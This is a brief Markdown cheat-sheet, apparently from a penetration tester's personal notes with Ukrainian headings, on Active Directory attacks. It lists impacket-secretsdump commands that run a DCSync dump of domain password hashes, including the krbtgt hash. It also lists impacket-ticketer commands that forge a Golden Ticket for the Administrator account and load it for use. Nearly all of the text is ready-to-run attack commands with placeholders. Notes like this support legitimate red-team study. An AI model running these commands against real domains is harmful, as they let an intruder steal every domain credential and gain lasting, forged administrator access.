# DCSync / Tickets

## DCSync (дамп хешів)
```bash
impacket-secretsdump <domain>/<u>:<p>@<DC>
impacket-secretsdump -just-dc-user krbtgt <domain>/<u>:<p>@<DC>
```
## Golden Ticket (після krbtgt hash)
```bash
impacket-ticketer -nthash <krbtgt> -domain-sid <SID> -domain <domain> Administrator
export KRB5CCNAME=Administrator.ccache
```
**Зв'язки:** [[Trusts]]
